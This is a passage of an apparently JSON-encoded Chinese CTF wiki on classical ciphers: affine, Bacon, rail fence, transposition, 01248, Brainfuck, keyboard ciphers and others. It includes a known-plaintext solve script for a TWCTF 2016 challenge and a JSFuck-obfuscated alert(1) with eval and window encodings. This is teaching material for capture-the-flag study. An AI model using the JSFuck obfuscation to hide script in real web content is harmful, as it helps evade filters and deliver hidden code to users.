<p>\u7b97\u4e0ab\u7684\u504f\u79fb\u53ef\u80fd\uff0c\u4e00\u5171\u6709\u53ef\u80fd\u7684\u5bc6\u94a5\u7a7a\u95f4\u5927\u5c0f\u4e5f\u5c31\u662f </p>  12 \\times 26 = 312  <p>\u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u4e8e\u8be5\u79cd\u5bc6\u7801\uff0c\u6211\u4eec\u81f3\u5c11\u5f97\u662f\u5728\u5df2\u77e5\u90e8\u5206\u660e\u6587\u7684\u60c5\u51b5\u4e0b\u624d\u53ef\u4ee5\u653b\u51fb\u3002\u4e0b\u9762\u8fdb\u884c\u7b80\u5355\u7684\u5206\u6790\u3002</p> <p>\u8fd9\u79cd\u5bc6\u7801\u7531\u4e24\u79cd\u53c2\u6570\u6765\u63a7\u5236\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5176\u4e2d\u4efb\u610f\u4e00\u4e2a\u53c2\u6570\uff0c\u90a3\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u5feb\u901f\u679a\u4e3e\u53e6\u5916\u4e00\u4e2a\u53c2\u6570\u5f97\u5230\u7b54\u6848\u3002</p> <p>\u4f46\u662f\uff0c\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u91c7\u7528\u7684\u5b57\u6bcd\u96c6\uff0c\u8fd9\u91cc\u5047\u8bbe\u4e3a26\u4e2a\u5b57\u6bcd\uff0c\u6211\u4eec\u8fd8\u6709\u53e6\u5916\u4e00\u79cd\u89e3\u5bc6\u65b9\u5f0f\uff0c\u6211\u4eec\u53ea\u9700\u8981\u77e5\u9053\u4e24\u4e2a\u52a0\u5bc6\u540e\u7684\u5b57\u6bcd y_1,y_2 \u5373\u53ef\u8fdb\u884c\u89e3\u5bc6\u3002\u90a3\u4e48\u6211\u4eec\u8fd8\u53ef\u4ee5\u77e5\u9053</p>  y_1=(ax_1+b)\\pmod{26} \\\\ y_2=(ax_2+b)\\pmod{26}  <p>\u4e24\u5f0f\u76f8\u51cf\uff0c\u53ef\u5f97</p>  y_1-y_2=a(x_1-x_2)\\pmod{26}  <p>\u8fd9\u91cc y_1,y_2 \u5df2\u77e5\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u5bc6\u6587\u5bf9\u5e94\u7684\u4e24\u4e2a\u4e0d\u4e00\u6837\u7684\u5b57\u7b26 x_1 \u4e0e x_2 \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5f88\u5bb9\u6613\u5f97\u5230 a \uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u5f97\u5230 b \u4e86\u3002</p>"},{"location":"crypto/classical/monoalphabetic/#_18","title":"\u4f8b\u5b50","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5TWCTF 2016 \u7684 super_express\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u7ed9\u7684\u6e90\u7801</p> <pre><code>import sys\nkey = '****CENSORED***************'\nflag = 'TWCTF{*******CENSORED********}'\n\nif len(key) % 2 == 1:\n    print(\"Key Length Error\")\n    sys.exit(1)\n\nn = len(key) / 2\nencrypted = ''\nfor c in flag:\n    c = ord(c)\n    for a, b in zip(key[0:n], key[n:2*n]):\n        c = (ord(a) * c + ord(b)) % 251\n    encrypted += '%02x' % c\n\nprint encrypted\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\uff0c\u867d\u7136\u5bf9\u4e8e flag \u4e2d\u7684\u6bcf\u4e2a\u5b57\u6bcd\u90fd\u52a0\u5bc6\u4e86 n \u6b21\uff0c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0</p>  \\begin{align*} c_1&amp;=a_1c+b_1 \\\\ c_2&amp;=a_2c_1+b_2 \\\\    &amp;=a_1a_2c+a_2b_1+b_2 \\\\    &amp;=kc+d \\end{align*}    <p>\u6839\u636e\u7b2c\u4e8c\u884c\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5176\u5b9e c_n \u4e5f\u662f\u8fd9\u6837\u7684\u5f62\u5f0f\uff0c\u53ef\u4ee5\u770b\u6210 c_n=xc+y \uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff0ckey \u662f\u59cb\u7ec8\u4e0d\u53d8\u5316\u7684\uff0c\u6240\u4ee5\u8bf4\uff0c\u5176\u5b9e\u8fd9\u4e2a\u5c31\u662f\u4eff\u5c04\u5bc6\u7801\u3002</p> <p>\u6b64\u5916\uff0c\u9898\u76ee\u4e2d\u8fd8\u7ed9\u51fa\u4e86\u5bc6\u6587\u4ee5\u53ca\u90e8\u5206\u90e8\u5206\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5f88\u5bb9\u6613\u5229\u7528\u5df2\u77e5\u660e\u6587\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u653b\u51fb\u4e86\uff0c\u5229\u7528\u4ee3\u7801\u5982\u4e0b</p> <pre><code>import gmpy\n\nkey = '****CENSORED****************'\nflag = 'TWCTF{*******CENSORED********}'\n\nf = open('encrypted', 'r')\ndata = f.read().strip('\\n')\nencrypted = [int(data[i:i + 2], 16) for i in range(0, len(data), 2)]\nplaindelta = ord(flag[1]) - ord(flag[0])\ncipherdalte = encrypted[1] - encrypted[0]\na = gmpy.invert(plaindelta, 251) * cipherdalte % 251\nb = (encrypted[0] - a * ord(flag[0])) % 251\na_inv = gmpy.invert(a, 251)\nresult = \"\"\nfor c in encrypted:\n    result += chr((c - b) * a_inv % 251)\nprint result\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b</p> <pre><code>\u279c  TWCTF2016-super_express git:(master) \u2717 python exploit.py\nTWCTF{Faster_Than_Shinkansen!}\n</code></pre>"},{"location":"crypto/classical/others/","title":"\u5176\u5b83\u7c7b\u578b\u52a0\u5bc6","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/classical/others/#_2","title":"\u57f9\u6839\u5bc6\u7801","text":""},{"location":"crypto/classical/others/#_3","title":"\u539f\u7406","text":"<p>\u57f9\u6839\u5bc6\u7801\u4f7f\u7528\u4e24\u79cd\u4e0d\u540c\u7684\u5b57\u4f53\uff0c\u4ee3\u8868 A \u548c B\uff0c\u7ed3\u5408\u52a0\u5bc6\u8868\u8fdb\u884c\u52a0\u89e3\u5bc6\u3002</p> a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB <p>\u4e0a\u9762\u7684\u662f\u5e38\u7528\u7684\u52a0\u5bc6\u8868\u3002\u8fd8\u6709\u53e6\u5916\u7684\u4e00\u79cd\u52a0\u5bc6\u8868\uff0c\u53ef\u8ba4\u4e3a\u662f\u5c06 26 \u4e2a\u5b57\u6bcd\u4ece 0 \u5230 25 \u6392\u5e8f\uff0c\u4ee5\u4e8c\u8fdb\u5236\u8868\u793a\uff0cA \u4ee3\u8868 0\uff0cB \u4ee3\u8868 1\u3002</p> <p>\u4e0b\u9762\u8fd9\u4e00\u6bb5\u5185\u5bb9\u5c31\u662f\u660e\u6587 steganography \u52a0\u5bc6\u540e\u7684\u5185\u5bb9\uff0c\u6b63\u5e38\u5b57\u4f53\u662f A\uff0c\u7c97\u4f53\u662f B\uff1a</p> <p>To encode a message each letter of the plaintext is replaced by a group of five of the letters 'A' or 'B'.</p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u57f9\u6839\u5bc6\u7801\u4e3b\u8981\u6709\u4ee5\u4e0b\u7279\u70b9</p> <ul> <li>\u53ea\u6709\u4e24\u79cd\u5b57\u7b26</li> <li>\u6bcf\u4e00\u6bb5\u7684\u957f\u5ea6\u4e3a 5</li> <li>\u52a0\u5bc6\u5185\u5bb9\u4f1a\u6709\u7279\u6b8a\u7684\u5b57\u4f53\u4e4b\u5206\uff0c\u4ea6\u6216\u8005\u5927\u5c0f\u5199\u4e4b\u5206\u3002</li> </ul>"},{"location":"crypto/classical/others/#_4","title":"\u5de5\u5177","text":"<ul> <li>http://rumkin.com/tools/cipher/baconian.php</li> </ul>"},{"location":"crypto/classical/others/#_5","title":"\u6805\u680f\u5bc6\u7801","text":""},{"location":"crypto/classical/others/#_6","title":"\u539f\u7406","text":"<p>\u6805\u680f\u5bc6\u7801\u628a\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210 N \u4e2a\u4e00\u7ec4\uff0c\u7136\u540e\u628a\u6bcf\u7ec4\u7684\u7b2c 1 \u4e2a\u5b57\u8fde\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u6bb5\u65e0\u89c4\u5f8b\u7684\u8bdd\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50</p> <pre><code>\u660e\u6587\uff1aTHERE IS A CIPHER\n</code></pre> <p>\u53bb\u6389\u7a7a\u683c\u540e\u53d8\u4e3a</p> <pre><code>THEREISACIPHER\n</code></pre> <p>\u5206\u6210\u4e24\u680f\uff0c\u4e24\u4e2a\u4e00\u7ec4\u5f97\u5230</p> <pre><code>TH ER EI SA CI PH ER\n</code></pre> <p>\u5148\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5b57\u6bcd\uff0c\u518d\u53d6\u51fa\u7b2c\u4e8c\u4e2a\u5b57\u6bcd</p> <pre><code>TEESCPE\nHRIAIHR\n</code></pre> <p>\u8fde\u5728\u4e00\u8d77\u5c31\u662f</p> <pre><code>TEESCPEHRIAIHR\n</code></pre> <p>\u4e0a\u8ff0\u660e\u6587\u4e5f\u53ef\u4ee5\u5206\u4e3a2\u680f\u3002</p> <pre><code>THEREIS ACIPHER\n</code></pre> <p>\u7ec4\u5408\u5f97\u5230\u5bc6\u6587</p> <pre><code>TAHCEIRPEHIESR\n</code></pre>"},{"location":"crypto/classical/others/#_7","title":"\u5de5\u5177","text":"<ul> <li>https://www.qqxiuzi.cn/bianma/zhalanmima.php</li> </ul>"},{"location":"crypto/classical/others/#_8","title":"\u66f2\u8def\u5bc6\u7801","text":""},{"location":"crypto/classical/others/#_9","title":"\u539f\u7406","text":"<p>\u66f2\u8def\u5bc6\u7801\uff08Curve Cipher\uff09\u662f\u4e00\u79cd\u6362\u4f4d\u5bc6\u7801\uff0c\u9700\u8981\u4e8b\u5148\u53cc\u65b9\u7ea6\u5b9a\u5bc6\u94a5\uff08\u4e5f\u5c31\u662f\u66f2\u8def\u8def\u5f84\uff09\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50</p> <pre><code>\u660e\u6587\uff1aThe quick brown fox jumps over the lazy dog\n</code></pre> <p>\u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09</p> <p></p> <p>\u52a0\u5bc6\u7684\u56de\u8def\u7ebf\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff09</p> <p></p> <pre><code>\u5bc6\u6587\uff1agesfc inpho dtmwu qoury zejre hbxva lookT\n</code></pre>"},{"location":"crypto/classical/others/#_10","title":"\u5217\u79fb\u4f4d\u52a0\u5bc6","text":""},{"location":"crypto/classical/others/#_11","title":"\u539f\u7406","text":"<p>\u5217\u79fb\u4f4d\u5bc6\u7801\uff08Columnar Transposition Cipher\uff09\u662f\u4e00\u79cd\u6bd4\u8f83\u7b80\u5355\uff0c\u6613\u4e8e\u5b9e\u73b0\u7684\u6362\u4f4d\u5bc6\u7801\uff0c\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u89c4\u5219\u5c06\u660e\u6587\u6253\u4e71\u6df7\u5408\u6210\u5bc6\u6587\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <p>\u6211\u4eec\u4ee5\u660e\u6587 <code>The quick brown fox jumps over the lazy dog</code>\uff0c\u5bc6\u94a5 <code>how are u</code> \u4e3a\u4f8b\uff1a</p> <p>\u5c06\u660e\u6587\u586b\u5165 5 \u884c 7 \u5217\u8868\uff08\u4e8b\u5148\u7ea6\u5b9a\u586b\u5145\u7684\u884c\u5217\u6570\uff0c\u5982\u679c\u660e\u6587\u4e0d\u80fd\u586b\u5145\u5b8c\u8868\u683c\u53ef\u4ee5\u7ea6\u5b9a\u4f7f\u7528\u67d0\u4e2a\u5b57\u6bcd\u8fdb\u884c\u586b\u5145\uff09</p> <p></p> <p>\u5bc6\u94a5\uff1a <code>how are u</code>\uff0c\u6309 <code>how are u</code> \u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u51fa\u73b0\u7684\u5148\u540e\u987a\u5e8f\u8fdb\u884c\u7f16\u53f7\uff0c\u6211\u4eec\u5c31\u6709 a \u4e3a 1\uff0ce \u4e3a 2\uff0ch \u4e3a 3\uff0co \u4e3a 4\uff0cr \u4e3a 5\uff0cu \u4e3a 6\uff0cw \u4e3a 7\uff0c\u6240\u4ee5\u5148\u5199\u51fa a \u5217\uff0c\u5176\u6b21 e \u5217\uff0c\u4ee5\u6b64\u7c7b\u63a8\u5199\u51fa\u7684\u7ed3\u679c\u4fbf\u662f\u5bc6\u6587\uff1a</p> <p></p> <p>\u5bc6\u6587\uff1a <code>qoury inpho Tkool hbxva uwmtd cfseg erjez</code></p>"},{"location":"crypto/classical/others/#_12","title":"\u5de5\u5177","text":"<ul> <li>http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/ \u884c\u5217\u6570\u76f8\u7b49</li> </ul>"},{"location":"crypto/classical/others/#01248","title":"01248 \u5bc6\u7801","text":""},{"location":"crypto/classical/others/#_13","title":"\u539f\u7406","text":"<p>\u8be5\u5bc6\u7801\u53c8\u79f0\u4e3a\u4e91\u5f71\u5bc6\u7801\uff0c\u4f7f\u7528 0\uff0c1\uff0c2\uff0c4\uff0c8 \u56db\u4e2a\u6570\u5b57\uff0c\u5176\u4e2d 0 \u7528\u6765\u8868\u793a\u95f4\u9694\uff0c\u5176\u4ed6\u6570\u5b57\u4ee5\u52a0\u6cd5\u53ef\u4ee5\u8868\u793a\u51fa \u5982\uff1a28=10\uff0c124=7\uff0c18=9\uff0c\u518d\u7528 1-&gt;26 \u8868\u793a A-&gt;Z\u3002</p> <p>\u53ef\u4ee5\u770b\u51fa\u8be5\u5bc6\u7801\u6709\u4ee5\u4e0b\u7279\u70b9</p> <ul> <li>\u53ea\u6709 0\uff0c1\uff0c2\uff0c4\uff0c8</li> </ul>"},{"location":"crypto/classical/others/#_14","title":"\u4f8b\u5b50","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5CFF 2016 \u5f71\u4e4b\u5bc6\u7801\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee</p> <p>8842101220480224404014224202480122</p> <p>\u6211\u4eec\u6309\u71670\u6765\u8fdb\u884c\u5206\u5272\uff0c\u5982\u4e0b</p> \u5185\u5bb9 \u6570\u5b57 \u5b57\u7b26 88421 8+8+4+2+1=23 W 122 1+2+2=5 E 48 4+8=12 L 2244 2+2+4+4=12 L 4 4 D 142242 1+4+2+2+4+2=15 O 248 2+4+8=14 N 122 1+2+2=5 E <p>\u6240\u4ee5\u6700\u540e\u7684 flag \u4e3a WELLDONE\u3002</p>"},{"location":"crypto/classical/others/#jsfuck","title":"JSFuck","text":""},{"location":"crypto/classical/others/#_15","title":"\u539f\u7406","text":"<p>JSFuck \u53ef\u4ee5\u53ea\u7528 6 \u4e2a\u5b57\u7b26 <code>[]()!+</code> \u6765\u7f16\u5199 JavaScript \u7a0b\u5e8f\u3002\u6bd4\u5982\u6211\u4eec\u60f3\u7528 JSFuck \u6765\u5b9e\u73b0 <code>alert(1)</code> \u4ee3\u7801\u5982\u4e0b</p> <pre><code>[][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]][([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+([][[]]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[+!+[]]]]+([][[]]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]((![]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+[+!+[]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])()\n</code></pre> <p>\u5176\u4ed6\u4e00\u4e9b\u57fa\u672c\u7684\u8868\u8fbe\uff1a</p> <pre><code>false       =&gt;  ![]\ntrue        =&gt;  !![]\nundefined   =&gt;  [][[]]\nNaN         =&gt;  +[![]]\n0           =&gt;  +[]\n1           =&gt;  +!+[]\n2           =&gt;  !+[]+!+[]\n10          =&gt;  [+!+[]]+[+[]]\nArray       =&gt;  []\nNumber      =&gt;  +[]\nString      =&gt;  []+[]\nBoolean     =&gt;  ![]\nFunction    =&gt;  [][\"filter\"]\neval        =&gt;  [][\"filter\"][\"constructor\"]( CODE )()\nwindow      =&gt;  [][\"filter\"][\"constructor\"](\"return this\")()\n</code></pre>"},{"location":"crypto/classical/others/#_16","title":"\u5de5\u5177","text":"<ul> <li>JSFuck \u5728\u7ebf\u52a0\u5bc6\u7f51\u7ad9</li> </ul>"},{"location":"crypto/classical/others/#brainfuck","title":"BrainFuck","text":""},{"location":"crypto/classical/others/#_17","title":"\u539f\u7406","text":"<p>Brainfuck\uff0c\u662f\u4e00\u79cd\u6781\u5c0f\u5316\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\uff0c\u5b83\u662f\u7531 Urban M\u00fcller \u5728 1993 \u5e74\u521b\u5efa\u7684\u3002\u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e00\u4e2a\u5728\u5c4f\u5e55\u4e0a\u6253\u5370Hello World\uff01\uff0c\u90a3\u4e48\u5bf9\u5e94\u7684\u7a0b\u5e8f\u5982\u4e0b\u3002\u5bf9\u4e8e\u5176\u4e2d\u7684\u539f\u7406\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u81ea\u884c\u7f51\u4e0a\u641c\u7d22\u3002</p> <pre><code>++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]\n&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.\n&gt;.+++.------.--------.&gt;+.&gt;.\n</code></pre> <p>\u4e0e\u5176\u5bf9\u5e94\u7684\u8fd8\u6709 ook\u3002</p>"},{"location":"crypto/classical/others/#_18","title":"\u5de5\u5177","text":"<ul> <li>https://www.splitbrain.org/services/ook</li> </ul>"},{"location":"crypto/classical/others/#_19","title":"\u732a\u5708\u5bc6\u7801","text":""},{"location":"crypto/classical/others/#_20","title":"\u539f\u7406","text":"<p>\u732a\u5708\u5bc6\u7801\u662f\u4e00\u79cd\u4ee5\u683c\u5b50\u4e3a\u57fa\u7840\u7684\u7b80\u5355\u66ff\u4ee3\u5f0f\u5bc6\u7801\uff0c\u683c\u5b50\u5982\u4e0b</p> <p></p> <p>\u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u660e\u6587\u4e3a <code>X marks the spot</code> \uff0c\u90a3\u4e48\u5bc6\u6587\u5982\u4e0b</p> <p></p>"},{"location":"crypto/classical/others/#_21","title":"\u5de5\u5177","text":"<ul> <li>http://www.simonsingh.net/The_Black_Chamber/pigpen.html</li> </ul>"},{"location":"crypto/classical/others/#_22","title":"\u821e\u52a8\u7684\u5c0f\u4eba\u5bc6\u7801","text":""},{"location":"crypto/classical/others/#_23","title":"\u539f\u7406","text":"<p>\u8fd9\u79cd\u5bc6\u7801\u51fa\u81ea\u4e8e\u798f\u5c14\u6469\u65af\u63a2\u6848\u96c6\u3002\u6bcf\u4e00\u4e2a\u8df3\u821e\u7684\u5c0f\u4eba\u5b9e\u9645\u4e0a\u5bf9\u5e94\u7684\u662f\u82f1\u6587\u4e8c\u5341\u516d\u4e2a\u5b57\u6bcd\u4e2d\u7684\u4e00\u4e2a\uff0c\u800c\u5c0f\u4eba\u624b\u4e2d\u7684\u65d7\u5b50\u5219\u8868\u660e\u8be5\u5b57\u6bcd\u662f\u5355\u8bcd\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5982\u679c\u4ec5\u4ec5\u662f\u4e00\u4e2a\u5355\u8bcd\u800c\u4e0d\u662f\u53e5\u5b50\uff0c\u6216\u8005\u662f\u53e5\u5b50\u4e2d\u6700\u540e\u7684\u4e00\u4e2a\u5355\u8bcd\uff0c\u5219\u5355\u8bcd\u4e2d\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4e0d\u5fc5\u4e3e\u65d7\u3002</p> <p></p>"},{"location":"crypto/classical/others/#_24","title":"\u952e\u76d8\u5bc6\u7801","text":"<p>\u6240\u8c13\u952e\u76d8\u5bc6\u7801\uff0c\u5c31\u662f\u91c7\u7528\u624b\u673a\u952e\u76d8\u6216\u8005\u7535\u8111\u952e\u76d8\u8fdb\u884c\u52a0\u5bc6\u3002</p>"},{"location":"crypto/classical/others/#_25","title":"\u624b\u673a\u952e\u76d8\u5bc6\u7801","text":"<p>\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\uff0c\u662f\u6bcf\u4e2a\u6570\u5b57\u952e\u4e0a\u6709 3-4 \u4e2a\u5b57\u6bcd\uff0c\u7528\u4e24\u4f4d\u6570\u5b57\u6765\u8868\u793a\u5b57\u6bcd\uff0c\u4f8b\u5982\uff1aru \u7528\u624b\u673a\u952e\u76d8\u8868\u793a\u5c31\u662f\uff1a7382\uff0c\u90a3\u4e48\u8fd9\u91cc\u5c31\u53ef\u4ee5\u77e5\u9053\u4e86\uff0c\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\u4e0d\u53ef\u80fd\u7528 1 \u5f00\u5934\uff0c\u7b2c\u4e8c\u4f4d\u6570\u5b57\u4e0d\u53ef\u80fd\u8d85\u8fc7 4\uff0c\u89e3\u5bc6\u7684\u65f6\u5019\u53c2\u8003\u6b64</p> <p></p> <p>\u5173\u4e8e\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u8fd8\u6709\u53e6\u4e00\u79cd\u65b9\u5f0f\uff0c\u5c31\u662f\u300c\u97f3\u7684\u300d\u5f0f\uff08\u8fd9\u4e00\u70b9\u53ef\u80fd\u6839\u636e\u624b\u673a\u7684\u4e0d\u540c\u4f1a\u6709\u6240\u4e0d\u540c\uff09\uff0c\u5177\u4f53\u53c2\u7167\u624b\u673a\u952e\u76d8\u6765\u6253\uff0c\u4f8b\u5982\uff1a\u300c\u6570\u5b57\u300d\u8868\u793a\u51fa\u6765\u5c31\u662f\uff1a748 94\u3002\u5728\u624b\u673a\u952e\u76d8\u4e0a\u9762\u6309\u4e0b\u8fd9\u51e0\u4e2a\u6570\uff0c\u5c31\u4f1a\u51fa\uff1a\u300c\u6570\u5b57\u300d\u7684\u62fc\u97f3\u3002</p>"},{"location":"crypto/classical/others/#_26","title":"\u7535\u8111\u952e\u76d8\u68cb\u76d8","text":"<p>\u7535\u8111\u952e\u76d8\u68cb\u76d8\u52a0\u5bc6\uff0c\u5229\u7528\u4e86\u7535\u8111\u7684\u68cb\u76d8\u65b9\u9635\u3002</p> <p></p>"},{"location":"crypto/classical/others/#_27","title":"\u7535\u8111\u952e\u76d8\u5750\u6807","text":"<p>\u7535\u8111\u952e\u76d8\u5750\u6807\u52a0\u5bc6\uff0c\u5229\u7528\u952e\u76d8\u4e0a\u9762\u7684\u5b57\u6bcd\u884c\u548c\u6570\u5b57\u884c\u6765\u52a0\u5bc6\uff0c\u4f8b\uff1abye \u7528\u7535\u8111\u952e\u76d8 XY \u8868\u793a\u5c31\u662f\uff1a351613</p> <p></p>"},{"location":"crypto/classical/others/#qwe","title":"\u7535\u8111\u952e\u76d8 QWE","text":"<p>\u7535\u8111\u952e\u76d8 QWE \u52a0\u5bc6\u6cd5\uff0c\u5c31\u662f\u7528\u5b57\u6bcd\u8868\u66ff\u6362\u952e\u76d8\u4e0a\u9762\u7684\u6392\u5217\u987a\u5e8f\u3002</p> <p></p>"},{"location":"crypto/classical/others/#_28","title":"\u952e\u76d8\u5e03\u5c40\u52a0\u5bc6","text":"<p>\u7b80\u5355\u5730\u8bf4\u5c31\u662f\u6839\u636e\u7ed9\u5b9a\u7684\u5b57\u7b26\u5728\u952e\u76d8\u4e0a\u7684\u6837\u5b50\u6765\u8fdb\u884c\u52a0\u5bc6\u3002</p>"},{"location":"crypto/classical/others/#0ctf-2014-classic","title":"0CTF 2014 classic","text":"<p>\u5c0f\u4e01\u4e01\u53d1\u73b0\u81ea\u5df1\u7f6e\u8eab\u4e8e\u4e00\u4e2a\u8be1\u5f02\u7684\u623f\u95f4\uff0c\u9762\u524d\u53ea\u6709\u4e00\u6247\u523b\u7740\u5947\u602a\u5b57\u7b26\u7684\u95e8\u3002 \u4ed6\u53d1\u73b0\u95e8\u8fb9\u4e0a\u8fd8\u6709\u4e00\u9053\u5bc6\u7801\u9501\uff0c\u4f3c\u4e4e\u8981\u8f93\u5165\u5bc6\u7801\u624d\u80fd\u5f00\u95e8\u3002\u30024esxcft5 rdcvgt 6tfc78uhg 098ukmnb</p> <p>\u53d1\u73b0\u8fd9\u4e48\u4e71\uff0c\u8fd8\u540c\u65f6\u5305\u62ec\u6570\u5b57\u548c\u5b57\u6bcd\u731c\u60f3\u53ef\u80fd\u662f\u952e\u76d8\u5bc6\u7801\uff0c\u8bd5\u7740\u5728\u952e\u76d8\u4e0a\u6309\u7167\u5b57\u6bcd\u987a\u5e8f\u63cf\u7ed8\u4e00\u4e0b\uff0c\u53ef\u5f97\u52300ops\u5b57\u6837\uff0c\u731c\u6d4b\u5c31\u662fflag\u4e86\u3002</p>"},{"location":"crypto/classical/others/#2017xman","title":"2017\u5e74xman\u9009\u62d4\u8d5b\u2014\u2014\u4e00\u4e8c\u4e09\uff0c\u6728\u5934\u4eba","text":"<p>\u6211\u6570123\u6728\u5934\u4eba\uff0c\u518d\u4e0d\u884c\u52a8\u5c31\u8981\u88ab\u6263\u5206\u3002</p> <p>23731263111628163518122316391715262121</p> <p>\u5bc6\u7801\u683c\u5f0fxman{flag}</p> 